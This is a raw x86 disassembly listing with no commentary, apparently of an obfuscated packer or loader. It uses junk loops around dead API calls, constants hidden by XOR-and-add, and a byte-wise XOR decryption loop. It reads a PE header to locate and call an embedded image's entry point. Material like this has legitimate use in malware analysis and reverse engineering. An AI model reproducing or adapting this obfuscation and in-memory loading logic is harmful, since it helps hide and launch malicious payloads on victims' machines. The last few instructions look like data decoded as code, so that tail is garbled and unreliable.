  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
